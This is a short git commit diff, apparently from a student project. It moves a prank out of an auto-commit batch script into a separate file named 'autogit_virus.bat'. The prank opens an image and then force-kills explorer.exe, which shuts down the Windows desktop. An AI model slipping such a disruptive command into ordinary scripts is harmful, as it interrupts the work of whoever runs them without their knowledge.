b153ccb4ee764b137d0bdb0ea9bdeb3486d5293f
Amaado <andresamadocibreiro22@gmail.com>
2024-02-08 21:53:50 +0100

    08/'2/24

--- autogit.bat
+++ autogit.bat
@@ -1,9 +1,5 @@
 cd C:\Users\DAM1_Alu02\Documents\GitHub\DAM1_archives
-@echo off
-start "" "C:\Users\DAM1_Alu02\Documents\GitHub\DAM1_archives\Dam1_web-main\pages\Cc2.png"
-ping -n 2 127.0.0.1 > nul
-taskkill /f /im explorer.exe
-//taskkill /f /im Microsoft.Photos.exe
+
 
 git add --all
 git commit -m "autoCommit %date:~-4%/%date:~3,2%/%date:~0,2%. Hora: %time:~0,2%:%time:~3,2%"
---
+++ autogit_virus.bat
@@ -0,0 +1,6 @@
+cd C:\Users\DAM1_Alu02\Documents\GitHub\DAM1_archives
+@echo off
+start "" "C:\Users\DAM1_Alu02\Documents\GitHub\DAM1_archives\Dam1_web-main\pages\Cc2.png"
+ping -n 2 127.0.0.1 > nul
+taskkill /f /im explorer.exe
+//taskkill /f /im Microsoft.Photos.exe
